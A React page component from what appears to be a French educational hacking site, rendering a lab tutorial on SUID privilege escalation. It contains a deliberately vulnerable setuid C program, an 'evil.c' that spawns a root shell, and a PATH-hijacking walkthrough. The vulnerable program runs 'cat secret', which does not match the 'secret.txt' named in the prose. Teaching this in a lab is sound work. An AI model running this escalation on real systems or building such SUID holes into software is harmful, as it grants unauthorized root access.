import React from "react";

import { HackingNav } from './home.jsx';

var Highlight = require('react-syntax-highlight');

export default class HackingSystem extends React.Component {
  constructor(props){
    super(props);
    this.state = {
      showSUID: false
    };
  }

  toggleShowSUID(){
    this.setState({showSUID: !this.state.showSUID});
  }

  render() {
    const toggleShowSUID = this.toggleShowSUID.bind(this);
    return (
      <div>
        <HackingNav />
        <div className='two-columns-page'>

          <div className='half-page half'>
            <h2>Tutoriels internes</h2>
            <ul>
              <li>
                <h3>SetUID<button className='margin-left' onClick={toggleShowSUID}>Voir {this.state.showSUID ? 'moins' : 'plus'}</button></h3>
                Les exécutables SetUID (ou SUID) sont des fichiers créés par un utilisateur (souvent administrateur) qui s'exécutent en utilisant les permissions données à leur auteur, et non celles de leur exécutant.<br/>
                Un exécutable SUID est très souvent vulnérable: un attaquant va l'utiliser pour réaliser une action autre que celle voulue par l'auteur.
              </li>
            </ul>
          </div>

          <div className='half-page half border-left'>
            {this.state.showSUID &&
              <div>
                Nous considérons que vous êtes sur un système UNIX (Linux ou MacOS).<br/>
                Nous présentons ici une élévation des privilèges (privilege escalation) simple basée sur un exécutable SUID très vulnérable.
                <ol>
                  <li>
                    En tant qu'administrateur (root) (<code>sudo commande</code> permet d'exécuter commande en tant que root):
                    <ol>
                      <li>
                        Se placer hors des dossiers utilisateurs, par exemple dans /home: <code>cd /home</code>
                      </li>
                      <li>
                        Ecrire un fichier secret.txt:<br/>
                        <code>sudo nano secret.txt</code><br/>
                        Ecrivez n'importe quoi.<br/>
                        Quittez avec Ctrl+X, Y puis Entrée.
                      </li>
                      <li>
                        Restreignez la lecture à root seul<br/>
                        <code>sudo chmod 400 secret.txt</code>
                      </li>
                      <li>
                        Ecrire le code de l'exécutable: source.c<br/>
                        <code>sudo nano source.c</code> puis copiez
                        <Highlight lang={"c"}
                          value={
                            "#include <stdlib.h>\n"+"#include <stdio.h>\n"+"#include <unistd.h>\n"+"\n"+"int main(int argc, char *argv[]){\n"+" printf(\"UID: %d\\n\", getuid());\n"+"  printf(\"EUID: %d\\n\", geteuid());\n"+"  setuid(0);\n"+" printf(\"UID: %d\\n\", getuid());\n"+"  printf(\"EUID: %d\\n\", geteuid());\n"+"  system(\"cat secret\");\n"+"}"
                          }
                        />
                        source.c affiche UID (User ID réelle) et EUID (Effective User ID), assigne l'UID à 0 (root) puis exécute la commande UNIX <code>cat secret.txt</code> qui affiche le contenu du fichier secret.txt que nous avons créé et qui n'est visible que par root.
                      </li>
                      <li>
                        Compiler source.c en un exécutable: <code>sudo gcc source.c -o executable</code>
                      </li>
                      <li>
                        Activez le SetUID bit sur executable: <code>sudo chmod +s executable</code><br/>
                        Vérifiez (avec ls -l) que les droits sur executable ressemblent à ça:<br/>
                        <code>-rwsr-sr-x  1 root    root     8816 mars  18 11:59 executable*</code><br/>
                        A gauche sont les droits (r = read, w = write, x = execute, s = setuid).
                      </li>
                      <li>
                        L'exemple ici a peu d'intérêt en soi, mais un exécutable SUID est souvent utilisé pour permettre à d'autres utilisateurs d'une machine de faire une action normalement réservée à root, comme changer un mot de passe.
                      </li>
                    </ol>
                  </li>
                  <li>
                    En tant qu'attaquant (non root):
                    <ol>
                      <li>
                        Exécutez executable pour voir le contenu de secret.txt sans être root: <code>./executable</code><br/>
                        Si cela ne marche pas, <a href='../contact'>contactez-nous</a>.
                      </li>
                      <li>
                        Revenir dans votre dossier personnel: <code>cd</code>
                      </li>
                      <li>
                        Ecrire le code de l'élévation des privilèges: evil.c<br/>
                        <Highlight lang={"c"}
                          value={
                            "#include <stdlib.h>\n"+"#include <stdio.h>\n"+"#include <unistd.h>\n"+"\n"+"int main(int argc, char *argv[]){\n"+" printf(\"CODE DE L'ATTAQUANT\\n\");\n"+" seteuid(0);\n"+"  setuid(0);\n"+" printf(\"UID: %d\\n\", getuid());\n"+"  printf(\"EUID: %d\\n\", geteuid());\n"+"  system(\"/bin/sh\");\n"+"}"
                          }
                        />
                        evil.c exécute la commande <code>/bin/sh</code>, ce qui démarre un terminal.
                      </li>
                      <li>
                        Compiler evil.c en un exécutable du nom de "cat": <code>gcc evil.c -o cat</code>
                      </li>
                      <li>
                        Notre but est de détourner executable pour le faire exécuter notre "cat" au lieu de la commande "cat" habituelle.<br/>
                        Quand on écrit la commande <code>cat secret.txt</code>, le Shell va chercher un fichier exécutable nommé "cat" dans les dossiers énumérés par la variable d'environnement PATH.<br/>
                        Voyez avec <code>echo $PATH</code>. Vous obtenez une liste de dossiers séparés par des ":". Dans ces dossiers se trouve /bin, qui contient le bon exécutable pour "cat".<br/>
                        Nous allons ajouter notre dossier présent à la variable PATH le temps d'une session Shell (il n'y restera que tant que notre terminal est ouvert) avec <code>export PATH=.:$PATH</code>.<br/>
                        Vu que le Shell parcourt PATH de gauche à droite quand il cherche les exécutables, il tombera sur notre dossier courant avant /bin et donc utilisera notre "cat" avant le "cat" habituel. 
                      </li>
                      <li>
                        Exécuter /home/executable tout en restant dans votre dossier courant: <code>/home/executable</code><br/>
                        Vous devriez obtenir ceci:
                        <Highlight lang={"c"}
                          value={
                            "UID: 1000\n"+"EUID: 0\n"+"UID: 0\n"+"EUID: 0\n"+"CODE DE L'ATTAQUANT\n"+"UID: 0\n"+"EUID: 0\n"+"# \n"+""
                          }
                        />
                        Vous pouvez écrire n'importe quelle commande après le #. Vous êtes dans un terminal en tant que root (vérifiez le avec <code>whoami</code>).<br/>
                        Remarquez que vous ne pouvez pas utiliser la commande "cat", car le Shell tombe sur votre cat avant /bin/cat ! Il vous suffit d'utliser <code>/bin/cat</code> à la place, ou bien de remettre la variable PATH à sa valeur de départ.
                      </li>
                      <li>
                        Vous êtes root sur votre propre ordinateur, donc vous n'avez rien de spécial à faire. Mais si vous étiez sur un ordinateur cible, vous pourriez faire des millions de choses normalement non permises ! Devenir root sur une machine cible est une victoire éclatante dans toute attaque.
                      </li>
                    </ol>
                  </li>
                  <li>
                    Dans la pratique:
                    <ul>
                      <li>Les fichiers SUID sont de moins en moins utilisés par les administrateurs du fait de leur vulnérabilité. La plupart des distributions de Linux ont pris des mesures pour restreindre l'usage de ces fichiers (le SUID ne marche pas sur les scripts Bash, dans les dossiers utilisateurs...). C'est une attaque vieille et donc rarement utilisable aujourd'hui.</li>
                      <li>Un attaquant normal n'a souvent pas accès au code source de l'exécutable SUID. Dans ce cas, il peut être intéressant de le désassembler (voir <a href="/hacking/binaries">Cybersécurité - Exécutables</a>) ou de regarder les chaînes de caractères lisibles par un humain (human readable strings) qu'il contient avec <code>strings executable</code> et repérer une commande UNIX dedans.</li>
                      <li>Nous avons présenté une élévation des privilèges avec l'ouverture d'un shell, mais vous pouvez aussi utiliser un lien symbolique vers une autre commande avec <code>ln -s destination source</code>. En nommant votre lien du nom de la commande exécutée, il fera le même détournement que l'exécutable issu de evil.c présenté ici (mais risque de souffrir des arguments donnés).</li>
                    </ul>
                  </li>
                </ol>
              </div>}
            
          </div>
        </div>
      </div>
    );
  }
}

